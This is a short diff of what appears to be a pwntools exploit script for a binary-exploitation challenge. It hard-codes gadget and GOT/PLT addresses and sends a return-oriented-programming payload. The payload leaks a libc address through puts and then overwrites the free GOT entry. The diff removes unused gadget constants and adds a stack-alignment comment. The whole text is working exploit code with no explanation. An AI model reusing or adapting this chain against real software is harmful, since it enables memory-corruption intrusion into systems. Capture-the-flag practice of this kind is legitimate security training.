@@ -32,15 +32,11 @@ POP_RDI = 0x401FF3
 RET = 0x401FF4
 LIBC_START_MAIN_GOT = 0x6030C0
 PUTS_PLT = 0x401000
-GADGET1 = 0x401FEA
-GADGET2 = 0x401FD0
 CALL_FREE = 0x401CBB
-SCANF_GOT = 0x603110
-FMSTR = 0x4020B7
 
 p.send("A"*8
         + p64(POP_RDI) + p64(LIBC_START_MAIN_GOT) + p64(PUTS_PLT)
-        + p64(RET)
+        + p64(RET) # Fix alignment for scanf
         + p64(CALL_FREE)
         + "A"* 64 + p64(FREE_GOT)
         + "\n")
